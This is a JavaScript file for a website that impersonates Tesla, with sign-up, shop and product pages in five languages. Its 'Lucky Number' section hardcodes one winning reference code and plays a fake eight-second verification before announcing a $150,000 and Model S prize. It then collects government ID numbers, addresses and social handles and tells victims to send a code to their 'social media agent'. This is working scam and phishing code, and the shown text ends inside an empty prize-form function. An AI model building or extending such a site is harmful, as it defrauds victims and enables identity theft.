// ============================================================
//  main.js  –  Tesla Site v2  (all bugs fixed + i18n)
// ============================================================

import { auth, db } from './firebase-config.js';
import {
  createUserWithEmailAndPassword, signInWithEmailAndPassword,
  signOut, onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
import {
  doc, setDoc, getDoc, getDocs, addDoc,
  collection, query, orderBy, updateDoc, serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// ═══════════════════════════════════════════════════════════════
//  TRANSLATIONS
// ═══════════════════════════════════════════════════════════════
const TX = {
  en:{
    reg_title:'Create Account',reg_name:'Full Name',reg_email:'Email Address',
    reg_phone:'Phone Number',reg_pass:'Password (min 6 chars)',reg_btn:'Create Account',
    reg_link:'Already have an account?',reg_signin:'Sign in',
    reg_creating:'Creating account…',reg_success:'Account created! Redirecting to sign in…',
    login_title:'Sign In',login_email:'Email Address',login_pass:'Password',
    login_btn:'Sign In',login_link:"Don't have an account?",login_register:'Create one',
    login_loading:'Signing in…',login_welcome:'Welcome back!',
    tab_cash:'Cash',tab_finance:'Finance',tab_lease:'Lease',
    cash_saved:'You save',fin_price:'Vehicle Price',fin_down:'Down Payment',
    fin_monthly:'Est. Monthly',fin_note:'*72-month term at 5.99% APR. Subject to credit approval.',
    fin_apply:'Apply for Financing',lease_monthly:'Monthly Lease',lease_due:'Due at Signing',
    lease_note:'*36-month lease, 10,000 mi/year. Excl. taxes & fees.',lease_start:'Start Lease',
    fsd_label:'Full Self-Driving (FSD)',fsd_sub:'$99/month subscription',fsd_on:'+$99/mo FSD included',
    shop_badge:'Save',shop_reduced:'Reduced by',shop_finance:'Est. financing from',
    shop_order:'Order Now',shop_details:'Details',
    lucky_badge:'Exclusive Promotion',lucky_title:'Lucky Number',
    lucky_sub:'Enter your exclusive reference code. One winner receives $150,000 & a Black Tesla Model S.',
    lucky_label:'Reference Code',lucky_ph:'e.g. SPE-XXXXXXXXXX',lucky_btn:'Verify Code',
    lucky_note:'Reference codes are provided by authorised Tesla agents only.',
    lucky_verifying:'Verifying Reference Code…',lucky_wait:'Please do not close this window',
    lucky_invalid:'Invalid reference code. Please try again.',
    w_congrats:'Congratulations!',w_won:'You Have Won',w_amount:'$150,000',
    w_prize:'+ a Black Tesla Model S',
    w_desc:'Your code has been verified. Click below to claim your prize and complete the vehicle claim form.',
    w_cta:'Click to Claim Your Prize →',
    pf_title:'Prize Claim Form',pf_sub:'Fill in your details accurately for prize disbursement.',
    pf_name:'Full Legal Name',pf_name_ph:'As on your ID',
    pf_address:'Delivery Address',pf_address_ph:'Full address including city & country',
    pf_id:'Government ID Number',pf_id_ph:'Passport / National ID',
    pf_social:'Social Media Handle',pf_social_ph:'@yourhandle',
    pf_submit:'Submit Prize Claim',pf_submitting:'Submitting…',
    pf_login:'You must be signed in to submit.',
    ps_title:'Claim Submitted!',ps_code_label:'Your unique Order Code:',
    ps_shot:'📸 Screenshot this code and share it with your social media agent.',
    ps_note:'Our team will contact you within 24–48 hours to arrange prize delivery.',
    ps_dash:'View My Dashboard →',
    err_name:'Name is required',err_email:'Email is required',
    err_phone:'Phone is required',err_pass:'Min 6 characters',
    range_lbl:'Range',accel_lbl:'0–60 mph',speed_lbl:'Top Speed',
    back_shop:'← Back to all vehicles',
    lang_pick:'Select your language',
  },
  zh:{
    reg_title:'创建账户',reg_name:'全名',reg_email:'电子邮箱',
    reg_phone:'手机号码',reg_pass:'密码（最少6位）',reg_btn:'创建账户',
    reg_link:'已有账户？',reg_signin:'登录',
    reg_creating:'创建中…',reg_success:'账户已创建！正在跳转到登录页…',
    login_title:'登录',login_email:'电子邮箱',login_pass:'密码',
    login_btn:'登录',login_link:'还没有账户？',login_register:'立即注册',
    login_loading:'登录中…',login_welcome:'欢迎回来！',
    tab_cash:'现金',tab_finance:'融资',tab_lease:'租赁',
    cash_saved:'节省',fin_price:'车辆价格',fin_down:'首付款',
    fin_monthly:'预估月供',fin_note:'*72个月，5.99% APR。需信用审批。',
    fin_apply:'申请融资',lease_monthly:'月租金',lease_due:'签约时支付',
    lease_note:'*36个月租赁，每年10,000英里。不含税费。',lease_start:'开始租赁',
    fsd_label:'全自动驾驶（FSD）',fsd_sub:'每月$99订阅',fsd_on:'+$99/月 FSD已含',
    shop_badge:'节省',shop_reduced:'减少了',shop_finance:'估计融资起',
    shop_order:'立即订购',shop_details:'详情',
    lucky_badge:'独家促销',lucky_title:'幸运号码',
    lucky_sub:'输入您的专属参考码。一位幸运儿将获得$150,000和一辆黑色特斯拉Model S。',
    lucky_label:'参考码',lucky_ph:'例如 SPE-XXXXXXXXXX',lucky_btn:'验证码',
    lucky_note:'参考码仅由授权特斯拉代理商提供。',
    lucky_verifying:'正在验证参考码…',lucky_wait:'请勿关闭此窗口',
    lucky_invalid:'参考码无效，请重试。',
    w_congrats:'恭喜您！',w_won:'您已赢得',w_amount:'$150,000',
    w_prize:'+ 一辆黑色特斯拉Model S',
    w_desc:'您的参考码已验证。点击下方领取奖品并填写车辆申领表。',
    w_cta:'点击领取您的奖品 →',
    pf_title:'奖品申领表',pf_sub:'请准确填写信息，用于奖品发放。',
    pf_name:'法律全名',pf_name_ph:'与证件一致',
    pf_address:'送货地址',pf_address_ph:'含城市和国家的完整地址',
    pf_id:'政府身份证号',pf_id_ph:'护照 / 身份证',
    pf_social:'社交媒体账号',pf_social_ph:'@您的账号',
    pf_submit:'提交申领',pf_submitting:'提交中…',
    pf_login:'请先登录后再提交。',
    ps_title:'申领已提交！',ps_code_label:'您的唯一订单码：',
    ps_shot:'📸 截图保存此码，并发送给您的社交媒体代理人。',
    ps_note:'我们的团队将在24–48小时内联系您安排奖品发放。',
    ps_dash:'查看我的控制台 →',
    err_name:'请填写姓名',err_email:'请填写邮箱',err_phone:'请填写手机号',err_pass:'最少6个字符',
    range_lbl:'续航',accel_lbl:'0–100km/h',speed_lbl:'最高车速',
    back_shop:'← 返回所有车辆',lang_pick:'选择您的语言',
  },
  ja:{
    reg_title:'アカウント作成',reg_name:'氏名',reg_email:'メールアドレス',
    reg_phone:'電話番号',reg_pass:'パスワード（6文字以上）',reg_btn:'アカウントを作成',
    reg_link:'すでにアカウントをお持ちですか？',reg_signin:'ログイン',
    reg_creating:'作成中…',reg_success:'アカウントを作成しました！ログイン画面へ移動します…',
    login_title:'ログイン',login_email:'メールアドレス',login_pass:'パスワード',
    login_btn:'ログイン',login_link:'アカウントをお持ちでない方は',login_register:'新規登録',
    login_loading:'ログイン中…',login_welcome:'おかえりなさい！',
    tab_cash:'現金',tab_finance:'ローン',tab_lease:'リース',
    cash_saved:'節約額',fin_price:'車両価格',fin_down:'頭金',
    fin_monthly:'月額目安',fin_note:'*72ヶ月、5.99% APR。審査が必要です。',
    fin_apply:'ローン申込',lease_monthly:'月額リース料',lease_due:'契約時支払い',
    lease_note:'*36ヶ月リース、年間10,000マイル。税金・手数料別。',lease_start:'リース開始',
    fsd_label:'完全自動運転（FSD）',fsd_sub:'月額$99',fsd_on:'+月額$99 FSD込み',
    shop_badge:'節約',shop_reduced:'値引き額',shop_finance:'ローン目安',
    shop_order:'今すぐ注文',shop_details:'詳細',
    lucky_badge:'限定プロモーション',lucky_title:'ラッキーナンバー',
    lucky_sub:'参照コードを入力してください。当選者は$150,000とテスラModel Sを獲得できます。',
    lucky_label:'参照コード',lucky_ph:'例: SPE-XXXXXXXXXX',lucky_btn:'コードを確認',
    lucky_note:'参照コードは認定テスラ代理店のみが提供します。',
    lucky_verifying:'参照コードを確認中…',lucky_wait:'このウィンドウを閉じないでください',
    lucky_invalid:'無効な参照コードです。もう一度お試しください。',
    w_congrats:'おめでとうございます！',w_won:'当選しました',w_amount:'$150,000',
    w_prize:'+ ブラックのテスラModel S',
    w_desc:'コードが確認されました。下記をクリックして賞品申請フォームにお進みください。',
    w_cta:'クリックして賞品を受け取る →',
    pf_title:'賞品申請フォーム',pf_sub:'正確な情報をご入力ください。',
    pf_name:'法的氏名',pf_name_ph:'IDと同じ表記で',
    pf_address:'配送先住所',pf_address_ph:'市区町村・国を含む完全な住所',
    pf_id:'政府発行ID番号',pf_id_ph:'パスポート / 国民ID',
    pf_social:'SNSアカウント',pf_social_ph:'@アカウント名',
    pf_submit:'申請を送信',pf_submitting:'送信中…',
    pf_login:'送信にはログインが必要です。',
    ps_title:'申請完了！',ps_code_label:'あなたの注文コード：',
    ps_shot:'📸 このコードをスクリーンショットし、SNS担当者に送付してください。',
    ps_note:'24〜48時間以内にご連絡いたします。',
    ps_dash:'ダッシュボードを見る →',
    err_name:'氏名を入力してください',err_email:'メールを入力してください',
    err_phone:'電話番号を入力してください',err_pass:'6文字以上必要です',
    range_lbl:'航続距離',accel_lbl:'0–100km/h',speed_lbl:'最高速度',
    back_shop:'← 車種一覧に戻る',lang_pick:'言語を選択してください',
  },
  no:{
    reg_title:'Opprett konto',reg_name:'Fullt navn',reg_email:'E-postadresse',
    reg_phone:'Telefonnummer',reg_pass:'Passord (min 6 tegn)',reg_btn:'Opprett konto',
    reg_link:'Har du allerede en konto?',reg_signin:'Logg inn',
    reg_creating:'Oppretter…',reg_success:'Konto opprettet! Omdirigerer til innlogging…',
    login_title:'Logg inn',login_email:'E-postadresse',login_pass:'Passord',
    login_btn:'Logg inn',login_link:'Har du ikke en konto?',login_register:'Registrer deg',
    login_loading:'Logger inn…',login_welcome:'Velkommen tilbake!',
    tab_cash:'Kontant',tab_finance:'Finansiering',tab_lease:'Leasing',
    cash_saved:'Du sparer',fin_price:'Kjøretøypris',fin_down:'Egenandel',
    fin_monthly:'Est. månedlig',fin_note:'*72 mnd, 5,99% ÅOP. Kredittgodkjenning kreves.',
    fin_apply:'Søk om finansiering',lease_monthly:'Månedlig leie',lease_due:'Betales ved signering',
    lease_note:'*36 mnd leasing, 16 000 km/år. Ekskl. avgifter.',lease_start:'Start leasing',
    fsd_label:'Full selvkjøring (FSD)',fsd_sub:'$99/mnd abonnement',fsd_on:'+$99/mnd FSD inkludert',
    shop_badge:'Spar',shop_reduced:'Redusert med',shop_finance:'Est. finansiering fra',
    shop_order:'Bestill nå',shop_details:'Detaljer',
    lucky_badge:'Eksklusiv kampanje',lucky_title:'Lykkenummer',
    lucky_sub:'Skriv inn din referansekode. Én vinner mottar $150 000 og en svart Tesla Model S.',
    lucky_label:'Referansekode',lucky_ph:'f.eks. SPE-XXXXXXXXXX',lucky_btn:'Bekreft kode',
    lucky_note:'Referansekoder leveres kun av autoriserte Tesla-agenter.',
    lucky_verifying:'Verifiserer referansekode…',lucky_wait:'Ikke lukk dette vinduet',
    lucky_invalid:'Ugyldig referansekode. Prøv igjen.',
    w_congrats:'Gratulerer!',w_won:'Du har vunnet',w_amount:'$150 000',
    w_prize:'+ en svart Tesla Model S',
    w_desc:'Koden din er bekreftet. Klikk nedenfor for å gjøre krav på premien.',
    w_cta:'Klikk for å kreve premien din →',
    pf_title:'Premiekravskjema',pf_sub:'Fyll ut nøyaktig for premie utbetaling.',
    pf_name:'Juridisk fullt navn',pf_name_ph:'Som på ID-en din',
    pf_address:'Leveringsadresse',pf_address_ph:'Full adresse inkl. by og land',
    pf_id:'Offentlig ID-nummer',pf_id_ph:'Pass / Nasjonalt ID',
    pf_social:'Sosiale medier-håndtak',pf_social_ph:'@dittbrukernavn',
    pf_submit:'Send inn krav',pf_submitting:'Sender…',
    pf_login:'Du må være logget inn for å sende inn.',
    ps_title:'Krav innsendt!',ps_code_label:'Din unike bestillingskode:',
    ps_shot:'📸 Ta skjermbilde av koden og send til din sosiale medier-agent.',
    ps_note:'Teamet vårt kontakter deg innen 24–48 timer.',
    ps_dash:'Se mitt dashbord →',
    err_name:'Navn er påkrevd',err_email:'E-post er påkrevd',
    err_phone:'Telefonnummer er påkrevd',err_pass:'Min. 6 tegn',
    range_lbl:'Rekkevidde',accel_lbl:'0–100 km/t',speed_lbl:'Topphastighet',
    back_shop:'← Tilbake til alle kjøretøy',lang_pick:'Velg ditt språk',
  },
  ko:{
    reg_title:'계정 만들기',reg_name:'이름',reg_email:'이메일 주소',
    reg_phone:'전화번호',reg_pass:'비밀번호 (최소 6자)',reg_btn:'계정 만들기',
    reg_link:'이미 계정이 있으신가요?',reg_signin:'로그인',
    reg_creating:'생성 중…',reg_success:'계정이 생성되었습니다! 로그인 페이지로 이동합니다…',
    login_title:'로그인',login_email:'이메일 주소',login_pass:'비밀번호',
    login_btn:'로그인',login_link:'계정이 없으신가요?',login_register:'회원가입',
    login_loading:'로그인 중…',login_welcome:'다시 오셨군요!',
    tab_cash:'현금',tab_finance:'할부',tab_lease:'리스',
    cash_saved:'절약 금액',fin_price:'차량 가격',fin_down:'계약금',
    fin_monthly:'예상 월납입금',fin_note:'*72개월, 5.99% APR 기준. 신용 심사 필요.',
    fin_apply:'할부 신청',lease_monthly:'월 리스료',lease_due:'계약 시 납입금',
    lease_note:'*36개월 리스, 연 16,000km. 세금·수수료 별도.',lease_start:'리스 시작',
    fsd_label:'완전 자율주행 (FSD)',fsd_sub:'월 $99 구독',fsd_on:'+월 $99 FSD 포함',
    shop_badge:'절약',shop_reduced:'할인 금액',shop_finance:'예상 할부',
    shop_order:'지금 주문',shop_details:'자세히',
    lucky_badge:'독점 프로모션',lucky_title:'행운 번호',
    lucky_sub:'전용 참조 코드를 입력하세요. 당첨자는 $150,000와 블랙 테슬라 Model S를 받습니다.',
    lucky_label:'참조 코드',lucky_ph:'예: SPE-XXXXXXXXXX',lucky_btn:'코드 확인',
    lucky_note:'참조 코드는 공인 테슬라 에이전트만 제공합니다.',
    lucky_verifying:'참조 코드 확인 중…',lucky_wait:'이 창을 닫지 마세요',
    lucky_invalid:'유효하지 않은 참조 코드입니다. 다시 시도해주세요.',
    w_congrats:'축하합니다!',w_won:'당첨되셨습니다',w_amount:'$150,000',
    w_prize:'+ 블랙 테슬라 Model S',
    w_desc:'코드가 확인되었습니다. 아래를 클릭하여 상금 신청 양식을 작성해주세요.',
    w_cta:'클릭하여 상금 수령하기 →',
    pf_title:'상금 신청 양식',pf_sub:'정확한 정보를 입력해 주세요.',
    pf_name:'법적 이름',pf_name_ph:'ID와 동일하게',
    pf_address:'배송 주소',pf_address_ph:'도시 및 국가 포함 전체 주소',
    pf_id:'정부 발급 ID 번호',pf_id_ph:'여권 / 주민등록증',
    pf_social:'소셜 미디어 핸들',pf_social_ph:'@아이디',
    pf_submit:'신청 제출',pf_submitting:'제출 중…',
    pf_login:'제출하려면 로그인이 필요합니다.',
    ps_title:'신청이 완료되었습니다!',ps_code_label:'고유 주문 코드:',
    ps_shot:'📸 이 코드를 스크린샷하여 소셜 미디어 에이전트에게 보내세요.',
    ps_note:'24–48시간 내에 연락드리겠습니다.',
    ps_dash:'내 대시보드 보기 →',
    err_name:'이름을 입력하세요',err_email:'이메일을 입력하세요',
    err_phone:'전화번호를 입력하세요',err_pass:'최소 6자 이상',
    range_lbl:'주행 거리',accel_lbl:'0–100km/h',speed_lbl:'최고 속도',
    back_shop:'← 전체 차량으로 돌아가기',lang_pick:'언어를 선택하세요',
  }
};

function detectLang(){
  const saved=localStorage.getItem('tesla_lang');
  if(saved&&TX[saved]) return saved;
  const nav=(navigator.language||'en').toLowerCase();
  if(nav.startsWith('zh')) return 'zh';
  if(nav.startsWith('ja')) return 'ja';
  if(nav.startsWith('ko')) return 'ko';
  if(nav.startsWith('nb')||nav.startsWith('nn')||nav.startsWith('no')) return 'no';
  return 'en';
}
export function t(k){ const l=detectLang(); return(TX[l]&&TX[l][k])||TX.en[k]||k; }

export function showLangSelector(){
  if(localStorage.getItem('tesla_lang_set')) return;
  const LANGS=[
    {code:'en',label:'🇬🇧 English'},
    {code:'zh',label:'🇨🇳 中文'},
    {code:'ja',label:'🇯🇵 日本語'},
    {code:'no',label:'🇳🇴 Norsk'},
    {code:'ko',label:'🇰🇷 한국어'},
  ];
  const ov=document.createElement('div');
  ov.id='lang-ov';
  ov.style.cssText='position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.94);backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;font-family:Outfit,sans-serif;';
  ov.innerHTML=`
    <div style="text-align:center;max-width:440px;padding:2rem 1.5rem;">
      <div style="font-size:3rem;margin-bottom:.75rem;">🌐</div>
      <div style="font-family:Rajdhani,sans-serif;font-size:1.8rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#fff;margin-bottom:.4rem;">Select Language</div>
      <div style="font-size:.78rem;letter-spacing:.08em;color:#9ca3af;margin-bottom:2rem;">选择语言 · 言語を選択 · Velg språk · 언어 선택</div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:.75rem;">
        ${LANGS.map(l=>`<button data-lang="${l.code}" style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.14);border-radius:10px;padding:1rem .75rem;color:#fff;font-size:1rem;font-weight:500;cursor:pointer;font-family:Outfit,sans-serif;transition:.2s;" onmouseover="this.style.background='rgba(255,255,255,.18)'" onmouseout="this.style.background='rgba(255,255,255,.07)'">${l.label}</button>`).join('')}
      </div>
    </div>`;
  document.body.appendChild(ov);
  ov.addEventListener('click',e=>{
    const btn=e.target.closest('[data-lang]');
    if(!btn) return;
    localStorage.setItem('tesla_lang',btn.dataset.lang);
    localStorage.setItem('tesla_lang_set','1');
    ov.remove();
    location.reload();
  });
}

// ═══════════════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════════════
const ADMIN_EMAIL='Solokumo05@gmail.com';
const LUCKY_CODE='SPE-87698432FZ';
const LOADER_MS=8000;

export const MODELS=[
  {id:'model3',    name:'Model 3',    tagline:'The car of the future, today.',       price:40240,range:'358 mi',topSpeed:'162 mph',acceleration:'3.1s', img:'https://images.unsplash.com/photo-1561580125-028ee3bd62eb?w=900&q=80'},
  {id:'modely',    name:'Model Y',    tagline:'Most versatile SUV ever made.',        price:43990,range:'330 mi',topSpeed:'155 mph',acceleration:'3.5s', img:'https://images.unsplash.com/photo-1619767886558-efdc259cde1a?w=900&q=80'},
  {id:'models',    name:'Model S',    tagline:'The pinnacle of performance.',         price:74990,range:'405 mi',topSpeed:'200 mph',acceleration:'1.99s',img:'https://images.unsplash.com/photo-1617788138017-80ad40651399?w=900&q=80'},
  {id:'modelx',    name:'Model X',    tagline:'Unmatched utility & performance.',     price:79990,range:'348 mi',topSpeed:'163 mph',acceleration:'2.5s', img:'https://images.unsplash.com/photo-1560958089-b8a1929cea89?w=900&q=80'},
  {id:'cybertruck',name:'Cybertruck', tagline:'Built for the future.',                price:99990,range:'340 mi',topSpeed:'130 mph',acceleration:'2.6s', img:'https://images.unsplash.com/photo-1692630083714-da8e4fc29b3d?w=900&q=80'},
];

// ═══════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════
export function applyDiscount(price,pct=20){return Math.round(price*(1-pct/100));}
export function formatUSD(n){return '$'+n.toLocaleString('en-US');}
export function calcFinance(price){
  let down=price<40000?3000:price<80000?6000:price<100000?9000:12000;
  const r=0.0599/12,m=72;
  const monthly=Math.round((price-down)*r/(1-Math.pow(1+r,-m)));
  return{down,monthly};
}
function genCode(){
  const c='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let s='TES-';
  for(let i=0;i<12;i++){if(i===4||i===8)s+='-';s+=c[Math.floor(Math.random()*c.length)];}
  return s;
}
function toast(msg,type='info'){
  let el=document.getElementById('toast');
  if(!el){
    el=document.createElement('div');el.id='toast';
    el.style.cssText='position:fixed;bottom:1.5rem;right:1.5rem;z-index:99998;padding:.75rem 1.5rem;border-radius:8px;font-size:.85rem;font-weight:600;letter-spacing:.04em;box-shadow:0 8px 32px rgba(0,0,0,.5);transition:opacity .4s;font-family:Outfit,sans-serif;min-width:220px;';
    document.body.appendChild(el);
  }
  el.textContent=msg;
  el.style.background=type==='error'?'#e31937':type==='success'?'#16a34a':'#1f2937';
  el.style.color='#fff';el.style.opacity='1';
  clearTimeout(el._t);
  el._t=setTimeout(()=>{el.style.opacity='0';},3500);
}
function setErr(id,msg){const el=document.getElementById(id);if(el)el.textContent=msg;}
function clrErr(){document.querySelectorAll('.form-error').forEach(e=>e.textContent='');}
function fbErr(code){
  const m={'auth/email-already-in-use':'This email is already registered.','auth/invalid-email':'Invalid email address.','auth/wrong-password':'Incorrect password.','auth/user-not-found':'No account found.','auth/weak-password':'Password too weak.','auth/invalid-credential':'Invalid email or password.','auth/too-many-requests':'Too many attempts. Wait and try again.'};
  return m[code]||'Something went wrong. Try again.';
}
const $=(id)=>document.getElementById(id);
const txt=(id,v)=>{const el=$(id);if(el)el.textContent=v;};
const ph=(id,v)=>{const el=$(id);if(el)el.placeholder=v;};

// ═══════════════════════════════════════════════════════════════
//  NAV
// ═══════════════════════════════════════════════════════════════
export function initNav(){
  const nav=$('navbar');if(!nav)return;
  window.addEventListener('scroll',()=>nav.classList.toggle('scrolled',scrollY>20));
  onAuthStateChanged(auth,user=>{
    const lo=$('nav-logout'),li=$('nav-login'),da=$('nav-dash');
    if(user){
      if(li)li.style.display='none';
      if(lo)lo.style.display='inline-flex';
      if(da)da.style.display='inline-flex';
    }else{
      if(li)li.style.display='inline-flex';
      if(lo)lo.style.display='none';
      if(da)da.style.display='none';
    }
  });
  $('nav-logout')?.addEventListener('click',async()=>{await signOut(auth);location.href='login.html';});
}

// ═══════════════════════════════════════════════════════════════
//  REGISTER — FIX: sign out after creation, redirect to login
// ═══════════════════════════════════════════════════════════════
export async function initRegister(){
  showLangSelector();
  const form=$('register-form');if(!form)return;
  // Apply translations to labels
  txt('reg-title-el',   t('reg_title'));
  txt('reg-name-label', t('reg_name'));
  txt('reg-email-label',t('reg_email'));
  txt('reg-phone-label',t('reg_phone'));
  txt('reg-pass-label', t('reg_pass'));
  txt('reg-btn-el',     t('reg_btn'));
  txt('reg-link-el',    t('reg_link'));
  txt('reg-signin-el',  t('reg_signin'));
  ph('reg-name','John Doe');ph('reg-email','you@example.com');
  ph('reg-phone','+1 555 000 0000');ph('reg-password','••••••••');

  // Sign out silently in case session exists
  try{await signOut(auth);}catch(_){}

  form.addEventListener('submit',async e=>{
    e.preventDefault();clrErr();
    const name=$('reg-name').value.trim();
    const email=$('reg-email').value.trim();
    const phone=$('reg-phone').value.trim();
    const pass=$('reg-password').value;
    let ok=true;
    if(!name){setErr('err-name',t('err_name'));ok=false;}
    if(!email){setErr('err-email',t('err_email'));ok=false;}
    if(!phone){setErr('err-phone',t('err_phone'));ok=false;}
    if(pass.length<6){setErr('err-password',t('err_pass'));ok=false;}
    if(!ok)return;
    const btn=form.querySelector('button[type=submit]');
    btn.disabled=true;btn.textContent=t('reg_creating');
    try{
      const{user}=await createUserWithEmailAndPassword(auth,email,pass);
      await setDoc(doc(db,'users',user.uid),{
        name,email,phone,
        role:email.toLowerCase()===ADMIN_EMAIL.toLowerCase()?'admin':'user',
        createdAt:serverTimestamp()
      });
      // ✅ FIX: sign out so they land on login clean
      await signOut(auth);
      toast(t('reg_success'),'success');
      setTimeout(()=>{location.href='login.html';},1800);
    }catch(err){
      setErr('err-email',fbErr(err.code));
      btn.disabled=false;btn.textContent=t('reg_btn');
    }
  });
}

// ═══════════════════════════════════════════════════════════════
//  LOGIN — FIX: case-insensitive email, proper role check
// ═══════════════════════════════════════════════════════════════
export async function initLogin(){
  showLangSelector();
  const form=$('login-form');if(!form)return;
  txt('login-title-el',   t('login_title'));
  txt('login-email-label',t('login_email'));
  txt('login-pass-label', t('login_pass'));
  txt('login-btn-el',     t('login_btn'));
  txt('login-link-el',    t('login_link'));
  txt('login-reg-el',     t('login_register'));
  ph('login-email','you@example.com');ph('login-password','••••••••');

  form.addEventListener('submit',async e=>{
    e.preventDefault();clrErr();
    const email=$('login-email').value.trim();
    const pass=$('login-password').value;
    const btn=form.querySelector('button[type=submit]');
    btn.disabled=true;btn.textContent=t('login_loading');
    try{
      const{user}=await signInWithEmailAndPassword(auth,email,pass);
      // ✅ FIX: check role from Firestore AND by email (case-insensitive)
      let role='user';
      try{
        const snap=await getDoc(doc(db,'users',user.uid));
        if(snap.exists())role=snap.data().role||'user';
      }catch(_){}
      if(user.email.toLowerCase()===ADMIN_EMAIL.toLowerCase())role='admin';
      toast(t('login_welcome'),'success');
      setTimeout(()=>{location.href=role==='admin'?'admin.html':'dashboard.html';},1000);
    }catch(err){
      setErr('err-login',fbErr(err.code));
      btn.disabled=false;btn.textContent=t('login_btn');
    }
  });
}

// ═══════════════════════════════════════════════════════════════
//  SHOP
// ═══════════════════════════════════════════════════════════════
export async function initShop(){
  showLangSelector();
  const grid=$('inventory-grid');if(!grid)return;
  let pct=20;
  try{const s=await getDoc(doc(db,'settings','global'));if(s.exists())pct=s.data().discountPct??20;}catch(_){}
  grid.innerHTML=MODELS.map(m=>{
    const d=applyDiscount(m.price,pct),sv=m.price-d,{monthly}=calcFinance(d);
    return`<div class="card fade-up">
      <div class="card-img"><img src="${m.img}" alt="${m.name}" loading="lazy"/></div>
      <div class="card-body">
        <span class="card-badge">${t('shop_badge')} ${pct}%</span>
        <div class="card-title">${m.name}</div>
        <div class="text-gray" style="font-size:.8rem;margin:.25rem 0 .75rem;">${m.tagline}</div>
        <div class="price-original">${formatUSD(m.price)}</div>
        <div class="price-now">${formatUSD(d)}</div>
        <div class="price-save">${t('shop_reduced')} ${formatUSD(sv)}</div>
        <div class="price-finance">${t('shop_finance')} ${formatUSD(monthly)}/mo</div>
        <div style="display:flex;gap:.5rem;margin-top:1rem;">
          <a href="product.html?id=${m.id}" class="btn btn-white" style="flex:1;">${t('shop_order')}</a>
          <a href="product.html?id=${m.id}" class="btn btn-dark"  style="flex:1;">${t('shop_details')}</a>
        </div>
      </div></div>`;
  }).join('');
}

// ═══════════════════════════════════════════════════════════════
//  PRODUCT — FIX: populate all fields + working tabs
// ═══════════════════════════════════════════════════════════════
export async function initProduct(){
  showLangSelector();
  const id=new URLSearchParams(location.search).get('id');
  const m=MODELS.find(x=>x.id===id);
  if(!m){location.href='shop.html';return;}

  let pct=20;
  try{const s=await getDoc(doc(db,'settings','global'));if(s.exists())pct=s.data().discountPct??20;}catch(_){}

  const d=applyDiscount(m.price,pct),sv=m.price-d,{down,monthly}=calcFinance(d);

  // ✅ FIX: populate all product fields
  const img=$('product-img');if(img){img.src=m.img;img.alt=m.name;}
  txt('product-name',m.name);txt('product-tagline',m.tagline);
  txt('product-range',m.range);txt('product-speed',m.topSpeed);txt('product-accel',m.acceleration);
  txt('label-range',t('range_lbl'));txt('label-accel',t('accel_lbl'));txt('label-speed',t('speed_lbl'));

  // Tab labels
  txt('tab-cash-btn',t('tab_cash'));txt('tab-finance-btn',t('tab_finance'));txt('tab-lease-btn',t('tab_lease'));

  // Cash
  txt('cash-price',formatUSD(d));txt('cash-original',formatUSD(m.price));
  txt('cash-saved',formatUSD(sv));txt('cash-saved-label',t('cash_saved'));

  // Finance
  txt('fin-price',formatUSD(d));txt('fin-down',formatUSD(down));txt('fin-monthly',formatUSD(monthly));
  txt('fin-price-lbl',t('fin_price'));txt('fin-down-lbl',t('fin_down'));txt('fin-monthly-lbl',t('fin_monthly'));
  txt('fin-note',t('fin_note'));txt('fin-apply-btn',t('fin_apply'));

  // Lease
  const lm=Math.round(d*0.012),ld=Math.round(down*0.8);
  txt('lease-monthly',formatUSD(lm));txt('lease-down',formatUSD(ld));
  txt('lease-monthly-lbl',t('lease_monthly'));txt('lease-due-lbl',t('lease_due'));
  txt('lease-note',t('lease_note'));txt('lease-start-btn',t('lease_start'));

  // FSD
  txt('fsd-label',t('fsd_label'));txt('fsd-sub',t('fsd_sub'));
  const fsdT=$('fsd-toggle'),fsdS=$('fsd-summary');
  fsdT?.addEventListener('change',()=>{if(fsdS)fsdS.textContent=fsdT.checked?t('fsd_on'):'';});

  txt('back-link',t('back_shop'));

  // ✅ FIX: Tab switching — show/hide via display property
  function switchTab(tabName){
    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.toggle('active',b.dataset.tab===tabName));
    document.querySelectorAll('.tab-panel').forEach(p=>{
      p.style.display=p.id==='tab-'+tabName?'block':'none';
    });
  }
  // Init tabs
  document.querySelectorAll('.tab-panel').forEach((p,i)=>p.style.display=i===0?'block':'none');
  document.querySelectorAll('.tab-btn').forEach(btn=>{
    btn.addEventListener('click',()=>switchTab(btn.dataset.tab));
  });
}

// ═══════════════════════════════════════════════════════════════
//  LUCKY — FIX: display toggling + translation
// ═══════════════════════════════════════════════════════════════
export function initLucky(){
  showLangSelector();
  const form=$('lucky-form'),loader=$('loader-screen'),winner=$('winner-screen'),normal=$('lucky-screen');
  if(!form)return;

  txt('lucky-title',t('lucky_title'));txt('lucky-sub',t('lucky_sub'));
  txt('lucky-label',t('lucky_label'));txt('lucky-btn-el',t('lucky_btn'));
  txt('lucky-note',t('lucky_note'));txt('loader-text',t('lucky_verifying'));
  txt('loader-wait',t('lucky_wait'));
  txt('w-congrats',t('w_congrats'));txt('w-won',t('w_won'));
  txt('w-amount',t('w_amount'));txt('w-prize',t('w_prize'));
  txt('w-desc',t('w_desc'));txt('w-cta-btn',t('w_cta'));
  ph('lucky-input',t('lucky_ph'));

  form.addEventListener('submit',async e=>{
    e.preventDefault();clrErr();
    const code=($('lucky-input').value||'').trim().toUpperCase();
    if(code!==LUCKY_CODE){setErr('err-lucky',t('lucky_invalid'));return;}

    // ✅ FIX: direct style toggle instead of class
    normal.style.display='none';
    loader.style.display='flex';
    await new Promise(r=>setTimeout(r,LOADER_MS));
    loader.style.display='none';
    winner.style.display='flex';
    winner.scrollIntoView({behavior:'smooth'});
  });
}

// ═══════════════════════════════════════════════════════════════
//  PRIZE FORM — shows on same page below winner card
// ═══════════════════════════════════════════════════════════════
export async function initPrizeForm(){
